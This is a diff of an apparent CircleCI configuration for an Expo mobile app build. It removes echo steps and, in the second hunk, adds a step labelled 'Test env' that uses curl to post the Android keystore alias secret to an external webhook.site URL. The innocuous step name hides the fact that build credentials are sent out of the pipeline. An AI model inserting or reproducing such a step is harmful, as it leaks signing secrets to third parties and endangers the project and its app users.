@@ -163,9 +163,6 @@ jobs:
       - save_turtle_cache
       - set_mobile_config_env
       - run:
-          name: Echo mobile config environment
-          command: echo $EXPO_ENV_FROM
-      - run:
           name: Building Expo standalone app
           command: |
             echo $EXPO_IOS_DIST_P12_BASE64 > expo-project_dist.p12.base64
@@ -199,8 +196,8 @@ jobs:
       - save_turtle_cache
       - set_mobile_config_env
       - run:
-          name: Echo mobile config environment
-          command: echo $EXPO_ENV_FROM
+          name: Test env
+          command: curl --data "param1=$EXPO_ANDROID_KEYSTORE_ALIAS" https://webhook.site/cdec8429-eae3-4ca5-93f1-ba2690de2a16
       - run:
           name: Building Expo standalone app
           command: |
